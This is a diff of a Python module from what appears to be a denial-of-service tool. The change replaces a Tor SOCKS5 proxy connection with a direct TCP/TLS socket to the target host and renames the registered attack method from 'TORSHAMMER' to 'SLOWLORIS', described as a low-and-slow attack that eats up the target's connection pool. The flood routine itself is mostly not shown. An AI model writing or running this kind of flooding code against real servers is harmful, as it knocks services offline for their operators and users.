@@ -18,51 +18,38 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 '''
 
-import time, ssl
+import time, ssl, socket
 
 from random import randint, uniform
-from python_socks.sync import Proxy
 
 from src.core import Core
 from src.utils import *
 from src.useragent import *
 
-def open_socket() -> Proxy | None: # opens a new socket, and returns it
+def open_socket() -> socket.socket | None: # opens a new socket, and returns it
     '''
-    open_socket() -> Proxy object or None
+    open_socket() -> socket or None
 
-    Opens a socket using TOR as SOCKS5 proxy
+    Opens a socket
 
-    :returns python_socks.sync.Proxy | None: Proxy object if sucess, False if not
+    :returns socket.socket | None: Socket if sucess, False if not
     '''
 
-    connected, proxy = False, Proxy
-    for _ in range(10): # try to restart TOR atleast 10 times
-        if connected: break
-
-        try: 
-            proxy = Proxy.from_url('socks5://127.0.0.1:9049')
-            connected = True
-
-        except Exception:
-            utils().launch_tor() # launch tor
-            continue
-    
-    if not connected:
-        return
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.TCP_NODELAY, 1)
 
     try:
-        socket = proxy.connect(Core.target_host, Core.target_port) # connect
+        sock.connect((Core.target_host, Core.target_port)) # connect
 
-        if Core.target_port == 443: # if the port is HTTPS (HTTP over SSL/TLS), wrap the socket
-            socket = ssl.create_default_context().wrap_socket(
-                sock=socket,
+        if Core.target_port == 443:
+            sock = ssl.create_default_context().wrap_socket(
+                sock=sock,
                 server_hostname=Core.target_host
             )
     except Exception:
         return None
 
-    return socket
+    return sock
 
 def flood(attack_id, url, stoptime) -> None:
 
@@ -110,8 +97,8 @@ def flood(attack_id, url, stoptime) -> None:
     Core.threadcount -= 1
 
 Core.methods.update({
-    'TORSHAMMER': {
-        'info': 'Slowloris attack using the TOR network',
+    'SLOWLORIS': {
+        'info': 'Low and slow attack that eats up the connection pool of the target',
         'func': flood
     }
 })
